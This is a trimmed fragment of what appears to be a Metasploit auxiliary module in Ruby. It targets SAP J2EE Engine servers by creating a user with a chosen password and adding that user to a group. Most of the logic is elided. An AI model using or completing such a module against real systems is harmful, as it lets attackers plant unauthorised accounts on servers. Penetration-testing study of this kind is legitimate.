...
class MetasploitModule < Msf::Auxiliary
  ...
  def run_host(_ip)
    ...
    if send_request(uri)
      print_good("User #{datastore['USERNAME']} with password #{datastore['PASSWORD']} successfully created")
    else
      return
    end

    vprint_status("Adding User to Group...")
    ...
    if res
      print_good("User #{datastore['USERNAME']} added to group #{datastore['GROUP']}")
    else
      return
    end
  ...
  def send_request(uri)
    ...
    if res && (res.code == 200) && res.headers['Server'] =~ /SAP J2EE Engine/
      ...
      vprint_error("Unexpected Response: #{res.code} #{res.message}")
      return false
    end
